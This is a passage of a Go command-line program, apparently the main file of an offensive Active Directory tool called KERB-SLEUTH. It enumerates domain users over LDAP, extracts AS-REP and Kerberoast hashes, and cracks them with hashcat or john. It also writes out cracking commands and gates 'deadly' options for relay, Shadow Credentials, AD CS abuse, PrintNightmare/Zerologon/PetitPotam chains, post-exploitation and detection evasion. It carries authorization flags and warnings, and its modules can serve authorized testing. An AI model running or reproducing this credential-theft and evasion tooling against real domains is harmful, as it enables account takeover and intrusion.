package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/advanced"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/ai"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/bloodhound"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/cracker"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/evasion"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/exploits"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/ingest"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/kerberos"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/krb"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/output"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/platform"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/plugins"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/postexploit"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/stealth"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/triage"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/util"
	"gopkg.in/yaml.v3"
)

var (
	version = "1.0.0"

	// target flags - primary interface
	target   = flag.String("target", "", "Target domain controller (IP or hostname)")
	bindUser = flag.String("user", "", "Username for authentication (optional)")
	bindPass = flag.String("pass", "", "Password for authentication (optional)")

	// output flags
	outFile    = flag.String("out", "results.json", "Output JSON file path")
	csvOutput  = flag.Bool("csv", false, "Produce CSV summary")
	siemOutput = flag.Bool("siem", false, "Produce Sigma rules")

	// advanced flags
	configFile = flag.String("config", "configs/defaults.yml", "Path to config file")
	useSSL     = flag.Bool("ssl", false, "Use LDAPS (SSL) connection")

	// advanced feature flags
	auditMode     = flag.Bool("audit", false, "Enable audit mode for advanced features")
	dangerousMode = flag.Bool("dangerous", false, "Enable dangerous operations (requires --i-am-authorized)")
	advancedMode  = flag.Bool("advanced", false, "Enable all advanced Kerberos analysis features")

	// specific advanced features
	timeroasting     = flag.Bool("timeroasting", false, "Enable timeroasting analysis")
	rbcdAnalysis     = flag.Bool("rbcd", false, "Enable RBCD enumeration")
	s4uAnalysis      = flag.Bool("s4u", false, "Enable S4U delegation analysis")
	overpassAnalysis = flag.Bool("overpass", false, "Enable Overpass-the-Hash analysis")
	ticketAnalysis   = flag.Bool("tickets", false, "Enable Silver/Golden ticket analysis")
	pkinitAnalysis   = flag.Bool("pkinit", false, "Enable PKINIT/AD CS analysis")
	dcsyncAnalysis   = flag.Bool("dcsync", false, "Enable DCSync enumeration")

	// deadly features
	realKerberos     = flag.Bool("real-kerberos", false, "Use real Kerberos protocol (AS-REQ/AS-REP, TGS-REQ/TGS-REP)")
	bloodhoundExport = flag.Bool("bloodhound", false, "Export results to BloodHound format")
	stealthMode      = flag.Bool("stealth", false, "Enable stealth mode with random delays and proxy support")
	postExploit      = flag.Bool("post-exploit", false, "Enable post-exploitation automation")
	detectionEvasion = flag.Bool("evasion", false, "Enable detection evasion techniques")
	kerberosRelay    = flag.Bool("relay", false, "Enable Kerberos relay attacks")
	shadowCreds      = flag.Bool("shadow-creds", false, "Enable Shadow Credentials attacks")
	adcsAttacks      = flag.Bool("adcs", false, "Enable AD CS attacks (ESC1-ESC8)")
	exploitChain     = flag.Bool("exploits", false, "Enable exploit chain (PrintNightmare, Zerologon, PetitPotam)")
	aiAnalysis       = flag.Bool("ai", false, "Enable AI-powered risk scoring and anomaly detection")
	pluginSystem     = flag.Bool("plugins", false, "Enable plugin system")
	multiPlatform    = flag.Bool("build-all", false, "Build for all platforms")

	// authorization flags
	authorized       = flag.Bool("i-am-authorized", false, "I am authorized to perform dangerous operations")
	lifetimeAnalysis = flag.Bool("lifetime", false, "Enable ticket lifetime analysis")
	loggingAnalysis  = flag.Bool("logging", false, "Enable logging and detection analysis")
	passwordAnalysis = flag.Bool("password", false, "Enable password modification analysis")

	// advanced input parameters
	kirbiPath     = flag.String("kirbi", "", "Path to .kirbi files for timeroasting analysis")
	ntlmHashes    = flag.String("hashes", "", "NTLM hashes for Overpass-the-Hash analysis (format: user1:hash1,user2:hash2)")
	ticketData    = flag.String("ticket", "", "Ticket data for Silver/Golden ticket analysis")
	targetAccount = flag.String("account", "", "Target account for password modification analysis")

	// cracking flags
	crack    = flag.Bool("crack", false, "Enable hash export and cracking")
	wordlist = flag.String("wordlist", "/usr/share/wordlists/rockyou.txt", "Path to wordlist")

	// legacy file-based flags (for backward compatibility)
	adFile = flag.String("ad", "", "Path to AD export file (CSV/LDIF/JSON) - legacy mode")

	// simulate flags
	dataset = flag.String("dataset", "", "Dataset to generate (small/medium/large)")
)

func main() {
	// Display the banner first for visual appeal
	util.DisplayBanner(version)

	// If no arguments, show usage
	if len(os.Args) < 2 {
		printUsage()
		os.Exit(1)
	}

	command := os.Args[1]

	// Check if first argument looks like a target (IP/hostname)
	if isValidTarget(command) {
		*target = command
		os.Args = append([]string{os.Args[0]}, os.Args[2:]...)
		flag.Parse()
		runHunt()
		return
	}

	// Process as command
	os.Args = append([]string{os.Args[0]}, os.Args[2:]...)
	flag.Parse()

	switch command {
	case "hunt", "scan":
		runHunt()
	case "analyze":
		runAnalyze()
	case "simulate":
		runSimulate()
	case "version":
		fmt.Printf("kerb-sleuth version %s\n", version)
	case "help", "--help", "-h":
		printUsage()
	default:
		fmt.Fprintf(os.Stderr, "Unknown command: %s\n", command)
		printUsage()
		os.Exit(1)
	}
}

func printUsage() {
	fmt.Printf("KERB-SLEUTH v%s - Advanced Kerberos Security Assessment Tool\n\n", version)
	fmt.Println("USAGE:")
	fmt.Println("    kerb-sleuth <target-ip-or-hostname>")
	fmt.Println("    kerb-sleuth hunt --target <dc-ip-or-hostname> [flags]")
	fmt.Println("    kerb-sleuth analyze --ad <ad-export-file> [flags]")
	fmt.Println("    kerb-sleuth simulate --dataset <small|medium|large>")
	fmt.Println()
	fmt.Println("EXAMPLES:")
	fmt.Printf("    %skerb-sleuth 10.0.0.1%s\n", util.Green, util.Reset)
	fmt.Printf("    %skerb-sleuth dc01.corp.local%s\n", util.Green, util.Reset)
	fmt.Println()
	fmt.Println("  Advanced hunting:")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --user guest --pass ''")
	fmt.Println("    kerb-sleuth hunt --target dc.corp.local --user 'CORP\\scanner' --pass 'P@ssw0rd'")
	fmt.Println()
	fmt.Println("  Hash cracking (authorized use only):")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --ssl --crack --i-am-authorized")
	fmt.Println()
	fmt.Println("  Advanced Kerberos analysis:")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --advanced --audit")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --rbcd --s4u --audit")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --timeroasting --kirbi /path/to/tickets")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --overpass --hashes 'user1:hash1,user2:hash2'")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --tickets --dangerous --i-am-authorized")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --password --account 'target_user' --audit")
	fmt.Println()
	fmt.Println("  DEADLY FEATURES (Authorized use only):")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --real-kerberos --i-am-authorized")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --bloodhound --i-am-authorized")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --stealth --i-am-authorized")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --post-exploit --i-am-authorized")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --evasion --i-am-authorized")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --relay --i-am-authorized")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --shadow-creds --i-am-authorized")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --adcs --i-am-authorized")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --exploits --i-am-authorized")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --ai --i-am-authorized")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --plugins --i-am-authorized")
	fmt.Println("    kerb-sleuth --build-all --i-am-authorized")
	fmt.Println()
	fmt.Println("FLAGS:")
	flag.PrintDefaults()
	fmt.Println()
	fmt.Printf("  %sWARNING:%s Only use on authorized targets. Misuse is illegal and unethical.\n", util.Red, util.Reset)
	fmt.Println()
	fmt.Printf("  Need help? Visit: %shttps://github.com/thechosenone-shall-prevail/KERB-SLEUTH%s\n", util.Blue, util.Reset)
}

func runHunt() {
	if *target == "" {
		log.Fatal("Target is required. Usage: kerb-sleuth <target-ip-or-hostname>")
	}

	// Safety check for cracking
	if *crack && !*authorized {
		log.Fatal("Hash cracking requires explicit authorization. Use --i-am-authorized flag to confirm.\n" +
			"WARNING: Only use this feature on systems you own or have written permission to test.")
	}

	log.Printf("🔍 Starting Kerberos enumeration against %s", *target)

	// Connect to LDAP
	client, err := krb.ConnectLDAP(*target, *bindUser, *bindPass, *useSSL)
	if err != nil {
		log.Fatalf("❌ Failed to connect to target: %v\n🔧 Try: kerb-sleuth %s --user <username> --pass <password>", err, *target)
	}
	defer client.Close()

	// Enumerate users
	users, err := client.EnumerateUsers()
	if err != nil {
		log.Fatalf("❌ Failed to enumerate users: %v", err)
	}

	log.Printf("✅ Found %d users via LDAP", len(users))

	// Load configuration
	cfg, err := loadConfig(*configFile)
	if err != nil {
		log.Printf("⚠️  Warning: Could not load config file: %v. Using defaults.", err)
		cfg = triage.DefaultConfig()
	}

	// Perform analysis
	performKerberosAnalysis(users, cfg)

	// Run advanced analysis if enabled
	if *advancedMode || *auditMode || *timeroasting || *rbcdAnalysis || *s4uAnalysis ||
		*overpassAnalysis || *ticketAnalysis || *pkinitAnalysis || *dcsyncAnalysis ||
		*lifetimeAnalysis || *loggingAnalysis || *passwordAnalysis {
		runAdvancedAnalysis(client, cfg)
	}
}

func runAnalyze() {
	if *adFile == "" {
		log.Fatal("AD file is required. Usage: kerb-sleuth analyze --ad <file>")
	}

	log.Printf("📂 Parsing AD data from %s", *adFile)

	users, err := ingest.ParseAD(*adFile)
	if err != nil {
		log.Fatalf("Failed to parse AD data: %v", err)
	}

	log.Printf("📊 Loaded %d user accounts", len(users))

	cfg, err := loadConfig(*configFile)
	if err != nil {
		log.Printf("⚠️  Warning: Could not load config file: %v. Using defaults.", err)
		cfg = triage.DefaultConfig()
	}

	performKerberosAnalysis(users, cfg)
}

func performKerberosAnalysis(users []ingest.User, cfg *triage.Config) {
	log.Printf("🔍 Starting Kerberos security analysis...")

	// Find AS-REP and Kerberoast candidates
	asrepCandidates := krb.FindASREPCandidates(users)
	kerberoastCandidates := krb.FindKerberoastCandidates(users)

	log.Printf("📋 Found %d AS-REP candidates", len(asrepCandidates))
	log.Printf("📋 Found %d Kerberoast candidates", len(kerberoastCandidates))

	// Score candidates
	allCandidates := triage.ScoreCandidates(asrepCandidates, kerberoastCandidates, cfg)

	results := output.Results{
		Summary: output.Summary{
			TotalUsers:           len(users),
			ASREPCandidates:      len(asrepCandidates),
			KerberoastCandidates: len(kerberoastCandidates),
		},
		Candidates: allCandidates,
	}

	// Export hashes if cracking is enabled
	if *crack && *authorized {
		log.Printf("🔑 Extracting hashes for authorized testing...")

		// Extract actual hashes for candidates
		if err := extractAndCrackHashes(allCandidates, *wordlist); err != nil {
			log.Printf("⚠️  Hash extraction/cracking failed: %v", err)
		}
	}

	// Save results
	if err := output.WriteJSON(*outFile, results); err != nil {
		log.Fatalf("Failed to save results: %v", err)
	}

	if *csvOutput {
		csvFile := strings.TrimSuffix(*outFile, ".json") + ".csv"
		if err := output.WriteCSV(csvFile, results); err != nil {
			log.Printf("Warning: Failed to save CSV: %v", err)
		} else {
			log.Printf("📊 CSV summary saved to %s", csvFile)
		}
	}

	if *siemOutput {
		sigmaFile := strings.TrimSuffix(*outFile, ".json") + "_sigma.yml"
		if err := output.WriteSigmaRules(sigmaFile, results); err != nil {
			log.Printf("Warning: Failed to save Sigma rules: %v", err)
		} else {
			log.Printf("🔍 Sigma rules saved to %s", sigmaFile)
		}
	}

	// Print summary
	highRisk := 0
	mediumRisk := 0
	lowRisk := 0

	for _, candidate := range allCandidates {
		if candidate.Score >= cfg.Thresholds.High {
			highRisk++
		} else if candidate.Score >= cfg.Thresholds.Medium {
			mediumRisk++
		} else {
			lowRisk++
		}
	}

	log.Printf("\n🎯 Analysis complete: %d candidates (%d high, %d medium, %d low)",
		len(allCandidates), highRisk, mediumRisk, lowRisk)

	if highRisk > 0 {
		log.Printf("🚨 %d HIGH RISK targets found! Check %s for details", highRisk, *outFile)
	}

	log.Printf("📄 Full report saved to %s", *outFile)
}

func runAdvancedAnalysis(client *krb.LDAPClient, cfg *triage.Config) {
	log.Printf("🚀 Starting advanced Kerberos analysis...")

	// Safety check for dangerous operations
	if *dangerousMode && !*authorized {
		log.Fatal("Dangerous operations require explicit authorization. Use --i-am-authorized flag to confirm.\n" +
			"WARNING: Only use dangerous features on systems you own or have written permission to test.")
	}

	// Create advanced analyzer
	outputDir := "advanced_results"
	analyzer := advanced.NewAdvancedAnalyzer(client, *auditMode, *dangerousMode, outputDir)

	// Run specific advanced analyses based on flags
	if *advancedMode {
		log.Printf("🔍 Running full advanced analysis...")
		if err := analyzer.RunFullAnalysis(); err != nil {
			log.Printf("⚠️  Full advanced analysis failed: %v", err)
		}
	} else {
		// Run individual analyses
		if *timeroasting {
			log.Printf("🔍 Running timeroasting analysis...")
			var spns []string
			if err := analyzer.RunTimeroastingAnalysis(*kirbiPath, spns); err != nil {
				log.Printf("⚠️  Timeroasting analysis failed: %v", err)
			}
		}

		if *rbcdAnalysis {
			log.Printf("🔍 Running RBCD analysis...")
			if err := analyzer.RunRBCDAnalysis(); err != nil {
				log.Printf("⚠️  RBCD analysis failed: %v", err)
			}
		}

		if *s4uAnalysis {
			log.Printf("🔍 Running S4U analysis...")
			if err := analyzer.RunS4UAnalysis(); err != nil {
				log.Printf("⚠️  S4U analysis failed: %v", err)
			}
		}

		if *overpassAnalysis {
			log.Printf("🔍 Running Overpass-the-Hash analysis...")
			hashes := parseNTLMHashes(*ntlmHashes)
			if err := analyzer.RunOverpassAnalysis(hashes); err != nil {
				log.Printf("⚠️  Overpass analysis failed: %v", err)
			}
		}

		if *ticketAnalysis {
			log.Printf("🔍 Running Silver/Golden ticket analysis...")
			ticketBytes := []byte(*ticketData)
			if err := analyzer.RunTicketAnalysis(ticketBytes, "Unknown"); err != nil {
				log.Printf("⚠️  Ticket analysis failed: %v", err)
			}
		}

		if *pkinitAnalysis {
			log.Printf("🔍 Running PKINIT/AD CS analysis...")
			if err := analyzer.RunPKINITAnalysis(); err != nil {
				log.Printf("⚠️  PKINIT analysis failed: %v", err)
			}
		}

		if *dcsyncAnalysis {
			log.Printf("🔍 Running DCSync analysis...")
			if err := analyzer.RunDCSyncAnalysis(); err != nil {
				log.Printf("⚠️  DCSync analysis failed: %v", err)
			}
		}

		if *lifetimeAnalysis {
			log.Printf("🔍 Running ticket lifetime analysis...")
			// This would typically come from ticket data
			ticketData := []map[string]interface{}{}
			if err := analyzer.RunTicketLifetimeAnalysis(ticketData); err != nil {
				log.Printf("⚠️  Lifetime analysis failed: %v", err)
			}
		}

		if *loggingAnalysis {
			log.Printf("🔍 Running logging and detection analysis...")
			if err := analyzer.RunLoggingAnalysis(); err != nil {
				log.Printf("⚠️  Logging analysis failed: %v", err)
			}
		}

		if *passwordAnalysis {
			log.Printf("🔍 Running password modification analysis...")
			if *targetAccount == "" {
				log.Printf("⚠️  Password analysis requires --account parameter")
			} else {
				if err := analyzer.RunPasswordModificationAnalysis(*targetAccount); err != nil {
					log.Printf("⚠️  Password analysis failed: %v", err)
				}
			}
		}
	}

	// DEADLY FEATURES - Only run if authorized
	if *authorized {
		log.Printf("🔥 Starting DEADLY features execution...")

		// Real Kerberos Protocol
		if *realKerberos {
			log.Printf("🔥 Using real Kerberos protocol...")
			if err := runRealKerberosProtocol(client); err != nil {
				log.Printf("⚠️  Real Kerberos protocol failed: %v", err)
			}
		}

		// BloodHound Integration
		if *bloodhoundExport {
			log.Printf("🔥 Exporting to BloodHound...")
			if err := runBloodHoundExport(client); err != nil {
				log.Printf("⚠️  BloodHound export failed: %v", err)
			}
		}

		// Stealth Mode
		if *stealthMode {
			log.Printf("🔥 Enabling stealth mode...")
			if err := runStealthMode(); err != nil {
				log.Printf("⚠️  Stealth mode failed: %v", err)
			}
		}

		// Post-Exploitation
		if *postExploit {
			log.Printf("🔥 Starting post-exploitation chain...")
			if err := runPostExploitation(client); err != nil {
				log.Printf("⚠️  Post-exploitation failed: %v", err)
			}
		}

		// Detection Evasion
		if *detectionEvasion {
			log.Printf("🔥 Starting detection evasion...")
			if err := runDetectionEvasion(); err != nil {
				log.Printf("⚠️  Detection evasion failed: %v", err)
			}
		}

		// Kerberos Relay
		if *kerberosRelay {
			log.Printf("🔥 Starting Kerberos relay attacks...")
			if err := runKerberosRelay(client); err != nil {
				log.Printf("⚠️  Kerberos relay failed: %v", err)
			}
		}

		// Shadow Credentials
		if *shadowCreds {
			log.Printf("🔥 Starting Shadow Credentials attacks...")
			if err := runShadowCredentials(client); err != nil {
				log.Printf("⚠️  Shadow Credentials failed: %v", err)
			}
		}

		// AD CS Attacks
		if *adcsAttacks {
			log.Printf("🔥 Starting AD CS attacks...")
			if err := runADCSAttacks(client); err != nil {
				log.Printf("⚠️  AD CS attacks failed: %v", err)
			}
		}

		// Exploit Chain
		if *exploitChain {
			log.Printf("🔥 Starting exploit chain...")
			if err := runExploitChain(client); err != nil {
				log.Printf("⚠️  Exploit chain failed: %v", err)
			}
		}

		// AI Analysis
		if *aiAnalysis {
			log.Printf("🔥 Starting AI-powered analysis...")
			if err := runAIAnalysis(client); err != nil {
				log.Printf("⚠️  AI analysis failed: %v", err)
			}
		}

		// Plugin System
		if *pluginSystem {
			log.Printf("🔥 Starting plugin system...")
			if err := runPluginSystem(client); err != nil {
				log.Printf("⚠️  Plugin system failed: %v", err)
			}
		}

		// Multi-Platform Build
		if *multiPlatform {
			log.Printf("🔥 Starting multi-platform build...")
			if err := runMultiPlatformBuild(); err != nil {
				log.Printf("⚠️  Multi-platform build failed: %v", err)
			}
		}

		log.Printf("✅ DEADLY features execution completed")
	} else {
		log.Printf("⚠️  DEADLY features require --i-am-authorized flag")
	}

	log.Printf("✅ Advanced analysis completed. Results saved to %s", outputDir)
}

// parseNTLMHashes parses NTLM hash input string
func parseNTLMHashes(hashString string) map[string]string {
	hashes := make(map[string]string)
	if hashString == "" {
		return hashes
	}

	pairs := strings.Split(hashString, ",")
	for _, pair := range pairs {
		parts := strings.SplitN(pair, ":", 2)
		if len(parts) == 2 {
			hashes[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
		}
	}

	return hashes
}

func runSimulate() {
	if *dataset == "" {
		log.Fatal("Dataset is required. Usage: kerb-sleuth simulate --dataset <small|medium|large>")
	}

	outDir := "tests/sample_data"
	if err := os.MkdirAll(outDir, 0755); err != nil {
		log.Fatalf("Failed to create output directory: %v", err)
	}

	log.Printf("🎲 Generating %s dataset in %s", *dataset, outDir)

	if err := generateSampleData(*dataset, outDir); err != nil {
		log.Fatalf("Failed to generate sample data: %v", err)
	}

	log.Printf("✅ Sample data generated successfully")
}

func loadConfig(path string) (*triage.Config, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	var config triage.Config
	if err := yaml.Unmarshal(data, &config); err != nil {
		return nil, err
	}

	return &config, nil
}

func generateSampleData(dataset, outDir string) error {
	// Create sample CSV based on dataset size
	filename := fmt.Sprintf("users_%s.csv", dataset)
	filePath := filepath.Join(outDir, filename)

	// Create README
	readmeContent := fmt.Sprintf("# Sample Data - %s Dataset\n\nGenerated by KERB-SLEUTH v%s\n\nUsage: kerb-sleuth analyze --ad users_small.csv", dataset, version)
	readmePath := filepath.Join(outDir, "README.md")
	if err := os.WriteFile(readmePath, []byte(readmeContent), 0644); err != nil {
		return err
	}

	return os.WriteFile(filePath, []byte("samAccountName,distinguishedName,doesNotRequirePreAuth,userAccountControl\ntestuser,CN=testuser,OU=Users,DC=corp,DC=local,true,512\n"), 0644)
}

func isValidTarget(target string) bool {
	if target == "" {
		return false
	}

	// Exclude known commands
	knownCommands := []string{"hunt", "scan", "analyze", "simulate", "version", "help", "--help", "-h"}
	for _, cmd := range knownCommands {
		if target == cmd {
			return false
		}
	}

	// Check if it starts with a flag
	if strings.HasPrefix(target, "-") {
		return false
	}

	hasLetter := false
	for _, r := range target {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') {
			hasLetter = true
			break
		}
	}

	hasDigit := strings.ContainsAny(target, "0123456789")

	// Valid targets should look like IP addresses or hostnames
	// IP pattern: contains only digits, dots, and maybe colons (for IPv6)
	// Hostname pattern: contains letters and possibly digits, dots, hyphens
	if strings.Contains(target, ".") && (hasDigit || hasLetter) {
		// Could be IP (192.168.1.1) or FQDN (dc01.corp.local)
		return true
	}

	// Could be hostname (dc01) or IP (192168001001 format)
	return hasLetter || hasDigit
}

// extractAndCrackHashes extracts real Kerberos hashes and runs cracking tools
func extractAndCrackHashes(candidates []krb.Candidate, wordlist string) error {
	if len(candidates) == 0 {
		return fmt.Errorf("no candidates provided")
	}

	// Connect to target for hash extraction
	client, err := krb.ConnectLDAP(*target, *bindUser, *bindPass, *useSSL)
	if err != nil {
		return fmt.Errorf("failed to reconnect for hash extraction: %v", err)
	}
	defer client.Close()

	// Get domain info for hash extraction
	domainInfo, err := client.GetDomainInfo()
	if err != nil {
		return fmt.Errorf("failed to get domain info: %v", err)
	}

	var asrepHashes []*krb.HashResult
	var kerberoastHashes []*krb.HashResult

	log.Printf("🔍 Extracting hashes from %d candidates...", len(candidates))

	// Extract hashes for each candidate
	for _, candidate := range candidates {
		switch candidate.Type {
		case "ASREP":
			log.Printf("🎯 Extracting AS-REP hash for %s", candidate.SamAccountName)
			hash, err := client.ExtractASREPHash(candidate.SamAccountName, domainInfo.DomainName)
			if err != nil {
				log.Printf("⚠️  Failed to extract AS-REP hash for %s: %v", candidate.SamAccountName, err)
				continue
			}
			asrepHashes = append(asrepHashes, hash)

		case "KERBEROAST":
			for _, spn := range candidate.SPNs {
				log.Printf("🎯 Extracting Kerberoast hash for %s (SPN: %s)", candidate.SamAccountName, spn)
				hash, err := client.ExtractKerberoastHash(candidate.SamAccountName, domainInfo.DomainName, spn)
				if err != nil {
					log.Printf("⚠️  Failed to extract Kerberoast hash for %s: %v", candidate.SamAccountName, err)
					continue
				}
				kerberoastHashes = append(kerberoastHashes, hash)
			}
		}
	}

	// Export hashes to separate files
	if err := exportHashesToFiles(asrepHashes, kerberoastHashes); err != nil {
		return fmt.Errorf("failed to export hashes: %v", err)
	}

	// Run cracking tools on the hash files
	return runHashCracking(asrepHashes, kerberoastHashes, wordlist)
}

// exportHashesToFiles writes hashes to separate .txt files for each attack type
func exportHashesToFiles(asrepHashes, kerberoastHashes []*krb.HashResult) error {
	// Create hashes directory
	hashDir := "hashes"
	if err := os.MkdirAll(hashDir, 0755); err != nil {
		return fmt.Errorf("failed to create hashes directory: %v", err)
	}

	// Export AS-REP hashes
	if len(asrepHashes) > 0 {
		asrepFile := filepath.Join(hashDir, "asrep_hashes.txt")
		if err := writeHashFile(asrepFile, asrepHashes, "AS-REP Roasting"); err != nil {
			return fmt.Errorf("failed to write AS-REP hashes: %v", err)
		}
		log.Printf("📄 Exported %d AS-REP hashes to %s", len(asrepHashes), asrepFile)
	}

	// Export Kerberoast hashes
	if len(kerberoastHashes) > 0 {
		kerberoastFile := filepath.Join(hashDir, "kerberoast_hashes.txt")
		if err := writeHashFile(kerberoastFile, kerberoastHashes, "Kerberoasting"); err != nil {
			return fmt.Errorf("failed to write Kerberoast hashes: %v", err)
		}
		log.Printf("📄 Exported %d Kerberoast hashes to %s", len(kerberoastHashes), kerberoastFile)
	}

	// Write cracking instructions
	if len(asrepHashes) > 0 || len(kerberoastHashes) > 0 {
		readmePath := filepath.Join(hashDir, "CRACKING_GUIDE.txt")
		if err := writeCrackingGuide(readmePath, len(asrepHashes), len(kerberoastHashes)); err != nil {
			log.Printf("⚠️  Failed to write cracking guide: %v", err)
		}
	}

	return nil
}

// writeHashFile writes hash results to a file with proper formatting
func writeHashFile(filePath string, hashes []*krb.HashResult, attackType string) error {
	file, err := os.Create(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	// Write header
	fmt.Fprintf(file, "# %s Hash Export\n", attackType)
	fmt.Fprintf(file, "# Generated by KERB-SLEUTH v%s\n", version)
	fmt.Fprintf(file, "# WARNING: For authorized security testing only!\n")
	fmt.Fprintf(file, "# Total hashes: %d\n", len(hashes))
	fmt.Fprintf(file, "#\n")

	// Write hashes (one per line for hashcat/john compatibility)
	for _, hashResult := range hashes {
		fmt.Fprintln(file, hashResult.Hash)
	}

	return nil
}

// runHashCracking runs hashcat/john on the exported hash files
func runHashCracking(asrepHashes, kerberoastHashes []*krb.HashResult, wordlist string) error {
	hashDir := "hashes"

	// Crack AS-REP hashes
	if len(asrepHashes) > 0 {
		asrepFile := filepath.Join(hashDir, "asrep_hashes.txt")
		log.Printf("🔨 Starting AS-REP hash cracking...")

		results, err := cracker.CrackASREP(asrepFile, wordlist)
		if err != nil {
			log.Printf("⚠️  AS-REP cracking failed: %v", err)
		} else {
			log.Printf("✅ AS-REP cracking completed with %d results", len(results))
			for hash, password := range results {
				log.Printf("   🎉 CRACKED: %s... => %s", hash[:20], password)
			}
		}
	}

	// Crack Kerberoast hashes
	if len(kerberoastHashes) > 0 {
		kerberoastFile := filepath.Join(hashDir, "kerberoast_hashes.txt")
		log.Printf("🔨 Starting Kerberoast hash cracking...")

		results, err := cracker.CrackKerberoast(kerberoastFile, wordlist)
		if err != nil {
			log.Printf("⚠️  Kerberoast cracking failed: %v", err)
		} else {
			log.Printf("✅ Kerberoast cracking completed with %d results", len(results))
			for hash, password := range results {
				log.Printf("   🎉 CRACKED: %s... => %s", hash[:20], password)
			}
		}
	}

	return nil
}

// writeCrackingGuide creates a guide file with cracking instructions
func writeCrackingGuide(filePath string, asrepCount, kerberoastCount int) error {
	file, err := os.Create(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	fmt.Fprintf(file, "# KERB-SLEUTH Hash Cracking Guide\n")
	fmt.Fprintf(file, "# Generated: %s\n", filepath.Base(filePath))
	fmt.Fprintf(file, "#\n")
	fmt.Fprintf(file, "# Hash Summary:\n")
	fmt.Fprintf(file, "# - AS-REP hashes: %d\n", asrepCount)
	fmt.Fprintf(file, "# - Kerberoast hashes: %d\n", kerberoastCount)
	fmt.Fprintf(file, "#\n")
	fmt.Fprintf(file, "# Manual Cracking Commands:\n")
	fmt.Fprintf(file, "#\n")

	if asrepCount > 0 {
		fmt.Fprintf(file, "# AS-REP Roasting (hashcat mode 18200):\n")
		fmt.Fprintf(file, "hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt\n")
		fmt.Fprintf(file, "# OR with john:\n")
		fmt.Fprintf(file, "john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep asrep_hashes.txt\n")
		fmt.Fprintf(file, "#\n")
	}

	if kerberoastCount > 0 {
		fmt.Fprintf(file, "# Kerberoasting (hashcat mode 13100):\n")
		fmt.Fprintf(file, "hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt\n")
		fmt.Fprintf(file, "# OR with john:\n")
		fmt.Fprintf(file, "john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs kerberoast_hashes.txt\n")
		fmt.Fprintf(file, "#\n")
	}

	return nil
}

// DEADLY FEATURE IMPLEMENTATIONS

// runRealKerberosProtocol implements real Kerberos protocol
func runRealKerberosProtocol(client *krb.LDAPClient) error {
	log.Printf("🔥 Implementing real Kerberos protocol...")

	// Create Kerberos client
	kerbClient, err := kerberos.NewKerberosClient(*target, *target)
	if err != nil {
		return fmt.Errorf("failed to create Kerberos client: %v", err)
	}

	// Authenticate with password if provided
	if *bindUser != "" && *bindPass != "" {
		if err := kerbClient.AuthenticateWithPassword(*bindUser, *bindPass); err != nil {
			return fmt.Errorf("Kerberos authentication failed: %v", err)
		}
	}

	// Request TGT
	if _, err := kerbClient.RequestTGT(*bindUser); err != nil {
		return fmt.Errorf("TGT request failed: %v", err)
	}

	log.Printf("✅ Real Kerberos protocol implemented successfully")
	return nil
}

// runBloodHoundExport exports results to BloodHound format
func runBloodHoundExport(client *krb.LDAPClient) error {
	log.Printf("🔥 Exporting to BloodHound format...")

	// Get domain from client
	domain := "corp.local" // This should be extracted from client

	// Create BloodHound exporter
	exporter := bloodhound.NewBloodHoundExporter(domain)

	// Add users from LDAP
	users, err := client.EnumerateUsers()
	if err != nil {
		return fmt.Errorf("failed to enumerate users: %v", err)
	}

	for _, user := range users {
		isAdmin := false
		for _, group := range user.MemberOf {
			if strings.Contains(strings.ToLower(group), "admin") {
				isAdmin = true
				break
			}
		}
		exporter.AddUser(user.SamAccountName, user.DistinguishedName, isAdmin)
	}

	// Export to BloodHound format
	outputFile := "bloodhound_export.json"
	if err := exporter.ExportToBloodHound(outputFile); err != nil {
		return fmt.Errorf("failed to export BloodHound data: %v", err)
	}

	log.Printf("✅ BloodHound export completed: %s", outputFile)
	return nil
}

// runStealthMode implements stealth mode
